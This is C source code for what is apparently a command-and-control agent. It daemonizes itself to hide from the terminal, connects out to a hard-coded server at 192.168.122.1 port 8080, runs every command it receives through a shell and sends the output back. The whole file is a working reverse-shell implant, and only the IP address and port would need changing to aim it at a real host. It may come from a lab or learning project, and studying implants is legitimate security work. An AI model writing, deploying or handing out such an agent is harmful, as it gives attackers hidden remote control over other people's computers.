#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int connect_to_server(const char *ip, int port);
void daemonize();

// main function that will sustain the connection with an infinite loop
int main(){
	daemonize();
	pid_t true_pid = getpid();
	FILE *pid_file = fopen("/tmp/c2-agent.pid", "w");
	if (pid_file != NULL){
		fprintf(pid_file, "%d", true_pid);
		fclose(pid_file);
	}

	char *ipaddr = "192.168.122.1";
	int port = 8080;

	char commandBuff[1024];
	char outputBuff[1024];

	int sock = connect_to_server(ipaddr, port);
	send(sock, "", 0, 0);
	while(1){
		sleep(10);
		while (1){
			memset(commandBuff, 0, sizeof(commandBuff));

			int received = recv(sock, commandBuff, sizeof(commandBuff), 0);
			if (received <= 0) {
				break;
			}

			// handles directory change
			if (strncmp(commandBuff, "cd ", 3) == 0){
				char *targetDir = commandBuff + 3;
				if (chdir(targetDir) == 0){
					// Do nothing
				} else{
					char *no_dir = "Directory doesn't exist\n";
					send(sock, no_dir, strlen(no_dir), 0);
				}
			}

			// handles other commands
			FILE *fp = popen(commandBuff, "r");
			if (fp == NULL){
				char *errorMsg = "command failed\n";
				send(sock, errorMsg, strlen(errorMsg), 0);
				continue;
			}

			while(fgets(outputBuff, sizeof(outputBuff), fp) != NULL){
				send(sock, outputBuff, strlen(outputBuff), 0);
				memset(outputBuff, 0, sizeof(outputBuff));
			}

			pclose(fp);
			char *done_msg = "<<AGENT_DONE>>";
			send(sock, done_msg, strlen(done_msg), 0);
		}
	}
	
	//close(sock);
	return 0;
}

// connects to the input id and port specified in the main function
// returns the socket pointer
int connect_to_server(const char *ip, int port){
	int sock;
	struct sockaddr_in server_addr;
	sock = (socket(AF_INET, SOCK_STREAM, 0));
	if (sock < 0){
		perror("socket failed\n");
		return -1;
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ip);

	if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
		perror("connection failed\n");
		close(sock);
		return -1;
	}

	printf("connected to server\n");
	return sock;
}

// daemonizes this process when called in the main function
// hiding it from the terminal window
void daemonize(){
	pid_t pid;

	// Detatch from therminal, child continues
	pid = fork();
	if (pid < 0){
		exit(EXIT_FAILURE);
	}
	if (pid > 0){
		exit(EXIT_SUCCESS); // parent process exits
	}
	// past this point only child process continues
	
	// session creation, child becomes session leader and leaves terminal (sneaky)
	if (setsid() < 0) {
		exit(EXIT_FAILURE);
	}

	// Fork again and session leader exits
	// grandchild continues, it is not a session leader
	// and cannot acquire a controlling terminal
	pid = fork();
	if (pid < 0){
		exit(EXIT_FAILURE);
	}
	if (pid > 0){
		exit(EXIT_SUCCESS);
	}
	// past this point only grandchild continues
	
	// reset file mask and set permissions
	umask(0);

	// Change working directory so we dont lock up others
	chdir("/");

	// close standard file Descriptors
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);
	
	open("/dev/null", O_RDONLY); // reopens stdin
	open("/dev/null", O_WRONLY); // reopens stdout
	open("/dev/null", O_RDWR); // reopens stderr
}




